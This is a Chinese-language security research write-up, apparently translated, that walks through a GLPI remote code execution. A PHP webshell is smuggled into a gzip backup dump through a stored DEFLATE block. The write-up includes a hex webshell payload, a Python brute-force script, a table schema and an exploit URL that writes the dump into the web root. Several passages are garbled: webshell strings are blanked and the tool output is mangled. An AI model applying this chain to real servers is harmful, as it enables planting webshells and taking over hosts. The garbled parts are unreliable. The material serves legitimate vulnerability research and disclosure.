[LZ77算法](https://en.wikipedia.org/wiki/LZ77_and_LZ78
"LZ77算法")和[Huffman编码](https://en.wikipedia.org/wiki/Huffman_coding
"Huffman编码")的更多细节不是本文的重点，但这里有维基百科的基本描述（和我们相关的）：
>   * LZ77算法通过 **替换重复重现** 的数据实现压缩，将其替换为未压缩数据流中此前已存在的相同数据的引用。
>   *
> Huffman算法的输出可以看作是对源符号（例如文件中的一个字母）编码的变长编码表，算法通过评估源符号中每个可能值出现的可能性或频率（权重）得到变长编码表。
> **与不常见的符号相比，更常见的符号使用较短的编码。**
>
在 **固定** Huffman编码块中，[DEFLATE RFC](https://tools.ietf.org/html/rfc1951#page-12
"DEFLATE RFC")对[变长编码表](https://stackoverflow.com/questions/46654777/deflate-and-fixed-huffman-codes/46658622#46658622 "变长编码表")进行了描述，因此被压缩器/解压缩器所熟知。  
**动态** Huffman编码中变长编码表是通过对给定输入进行专门计算得到的，编码表包含在生成的块中。
## Previous research - fixed blocks
_DEFLATE_ 数据格式用于多种文件格式，包括[PNG](https://tools.ietf.org/html/rfc2083 "PNG")。
一些研究人员已经设法将PHP
Webshell嵌入到PNG图像中：[idontplaydarts](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
"idontplaydarts")，[adamlogue](https://www.adamlogue.com/revisiting-xss-payloads-in-png-idat-chunks/
"adamlogue")，[whitton](https://whitton.io/articles/xss-on-facebook-via-png-content-types/ "whitton")  
大体上看，他们的方法是相同的：将随机字节预置/追加到PHP Webshell输出并解压，直到没有错误。
[idontplaydarts](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ "idontplaydarts")的payload是这样的：
    # Input data to DEFLATE - raw version (" escaped for syntax coloring)
    $ php -r "echo hex2bin('03a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310') . PHP_EOL;"
    gTo,$+gTo.)+!g\"ko_S
    # Input data to DEFLATE - hexdump version (" escaped for syntax coloring)
    $ php -r "echo hex2bin('03a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310') . PHP_EOL;" | hexdump -C
    00000000  03 a3 9f 67 54 6f 2c 24  15 2b 11 67 12 54 6f 11  |...gTo,$.+.g.To.|
    00000010  2e 29 15 2b 21 67 22 6b  6f 5f 53 10 0a           |.).+!g\"ko_S..|
    # DEFLATE output
    $ php -r "echo gzdeflate(hex2bin('03a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310')) . PHP_EOL;"
    c^X
使用Mark Adler的[infgen](https://github.com/madler/infgen/ "infgen")工具，我们可以获取到
DEFLATE 流的更多细节:
    ! infgen 2.4 output
    !
    last
    fixed
    literal 3 163 159 'gTo,$
    literal 21 '+
    literal 17 'g
    literal 18 'To
    literal 17 '.)
    literal 21 '+!g"ko_S
    literal 16
    end
  * `last`：最后的块（这里只有一个块）
  * `fixed`：使用固定Huffman编码块
  * `literal`：十进制数字字节或前有单引号的可打印字符串
  * `end`：我们已经到达块的结尾  
所以 _DEFLATE_
压缩器选择了固定Huffman编码。事实上，输入非常短，如果使用动态Huffman编码会创建一个更大的块，因为编码表需要包含在块中。
这些先前的PoC是在没有输入限制的情况下创建的，但是我们的payload有一些限制。  
GLPI在`comment`列中将MySQL编码定义为 **utf8** ：
    `comment` text COLLATE utf8_unicode_ci,
根据[MySQL文档](https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-utf8.html
"MySQL文档")：
> utf8是utf8mb3的别名。
utf8mb3字符集实际上是3字节的UTF-8
Unicode编码。这意味着MySQL无法保存[所有4字节的UTF-8字符](https://medium.com/%40adamhooper/in-mysql-never-use-utf8-use-utf8mb4-11761243e434 "所有4字节的UTF-8字符")
payload只能包含[Basic Multilingual Plane
(BMP)](https://en.wikipedia.org/wiki/Plane_%28Unicode%29#Basic_Multilingual_Plane
"Basic Multilingual Plane \(BMP\)")中的字符，即前65536个码位之一。
因此，类似于 idontplaycharts 所描述的那种payload，比如
`0x03a39f67546f2c24152b116712546f112e29152b2167226b6f5f5310`，是无效的:
`0xa3`或`0x03a3`不是有效 [UTF-8字符](https://www.utf8-chartable.de/unicode-utf8-table.pl?unicodeinhtml=hex "UTF-8字符")的十六进制表示。
注意:
为了在MySQL中完全支持UTF8，推荐使用[utf8mb4](https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-sets.html "utf8mb4")字符集。
因此，固定Huffman编码块方法是一个死胡同。
## Non compressed blocks
对未压缩块的深入研究后发现它们非常有趣，因为输入直接原样包含在输出中。
直接创建一个3字节UTF-8字符的未压缩块似乎是不可能的（？），因为`comment`值之前的数据前面有许多冗余数据，例如`COLLATE
utf8_unicode_ci DEFAULT`, 总之它是无用的，我们将在后面看到。
这里提醒下大家压缩了什么：
    ### Dump table glpi_wifinetworks
    DROP TABLE IF EXISTS `glpi_wifinetworks`;
    CREATE TABLE `glpi_wifinetworks` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `entities_id` int(11) NOT NULL DEFAULT '0',
      `is_recursive` tinyint(1) NOT NULL DEFAULT '0',
      `name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
      `essid` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
      `mode` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL COMMENT 'ad-hoc, access_point',
      `comment` text COLLATE utf8_unicode_ci,
      `date_mod` datetime DEFAULT NULL,
      `date_creation` datetime DEFAULT NULL,
      PRIMARY KEY (`id`),
      KEY `entities_id` (`entities_id`),
      KEY `essid` (`essid`),
      KEY `name` (`name`),
      KEY `date_mod` (`date_mod`),
      KEY `date_creation` (`date_creation`)
    ) ENGINE=InnoDB  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
    INSERT INTO `glpi_wifinetworks` VALUES ('1','0','0','Name','ESSID','ad-hoc','our comment here','2020-04-25 11:14:39','2020-04-21 10:55:09');
我们的策略是创建一个特别设计的`comment`，以达到这样的目的：
  * 第一个 _DEFLATE_ 块（动态Huffman）-包含表定义和开始的`INSERT`语句-填满这个块
  * 下一个区块是未压缩的，包含PHP webshell
下面是一段简短的Python3代码，用来查找未压缩的块。  
这个脚本使用的webshell为 `.`。添加`ls`可以更轻松地找到未压缩且可更改的块（例如，可以添加/删除一些字符而不会导致块被压缩）。
    #!/usr/bin/env python3
    from zlib import compress
    import random
    import multiprocessing as mp
    def gen(n): # Generate random bytes in the BMP
        rand_bytes = b''
        for i in range(n):
            rand_bytes = rand_bytes + chr(random.randrange(0, 65535)).encode('utf8', 'surrogatepass')
        return rand_bytes
    def attack():
        while True:
            for i in range(1,200):
                rand_bytes = gen(i)
                to_compress = b"','2020-04-21 10:55:09','2020-04-21 10:55:09');"
                to_compress =  rand_bytes +  to_compress # Random bytes are prepended to our payload. We include the dates: there will be compressed too.
                compressed = compress(to_compress)
                if b'php system' in compressed: # Check whether the input is in the output
                        print(to_compress)
    if __name__ == "__main__":
        processes = [mp.Process(target=attack) for x in range(8)]
        for p in processes:
            p.start()
结果如下：
    $ cat input_stored
    챻𫄛摌ྪⴇﲈ珹꘎۱⦛ൿ轹σអǑ樆ಧ嬑ൟ냁卝ⅵ㡕蒸榓ꎢ蜒䭘勼ꔗㆾ褅朵顶钨捴ǕӢퟹ뉌ꕵ붎꺉૾懮㛡نŶ有ʡﳷ䍠죫펪唗鋊嗲켑辋䷪ᰀ쵈ᩚ∰雑𢡊Ս䙝䨌','2020-04-21 10:55:09','2020-04-21 10:55:09');
    $ gzip -k input_stored && cat input_stored.gz
    )^input_stored.챻𫄛摌ྪⴇﲈ珹꘎۱⦛ൿ轹σអǑ樆ಧ嬑ൟ냁卝ⅵ㡕蒸榓ꎢ蜒䭘勼ꔗㆾ褅朵顶钨捴ǕӢퟹ뉌ꕵ붎꺉૾懮㛡نŶ有ʡﳷ䍠죫펪唗鋊嗲켑辋䷪ᰀ쵈ᩚ∰雑𢡊Ս䙝䨌','2020-04-21 10:55:09','2020-04-21 10:55:09');
       6.
`infgen`可以确认结果块确实是一个存储块：
    $ gzip ','2020-04-21 10:55:09','2020-04-21 10:55:09');
    data 10
    end
    !
    crc
    length
现在，我们需要在`챻𫄛摌ྪⴇﲈ珹꘎۱⦛ൿ轹σអǑ樆ಧ嬑ൟ냁卝ⅵ㡕蒸榓ꎢ蜒䭘勼ꔗㆾ褅朵顶钨捴ǕӢퟹ뉌ꕵ붎꺉૾懮㛡نŶ有ʡﳷ䍠죫펪唗鋊嗲켑辋䷪ᰀ쵈ᩚ∰雑𢡊Ս䙝䨌`前面放大量字符，来填满一个块（关于填满块的细节在下面一点）。
因此，通过使用[这个payload](https://github.com/AlmondOffSec/PoCs/tree/master/glpi_rce_gzip/padded_and_stored_block.txt
"这个payload")作为`comment`，我们可以通过URL（[http://host/front/backup.php?dump=dump&offsettable=312&fichier=/var/www/html/test.php）](http://host/front/backup.php?dump=dump&offsettable=312&fichier=/var/www/html/test.php）)  
生成dump。
然而PHP webshell并没有被执行。  
一个编码的字符似乎是罪魁祸首:  
原来，GLPI的XSS过滤器在将字符``保存到数据库之前对它们进行了编码：
    <?php
    static function clean_cross_side_scripting_deep($value) {
       if ((array) $value === $value) {
          return array_map([__CLASS__, 'clean_cross_side_scripting_deep'], $value);
       }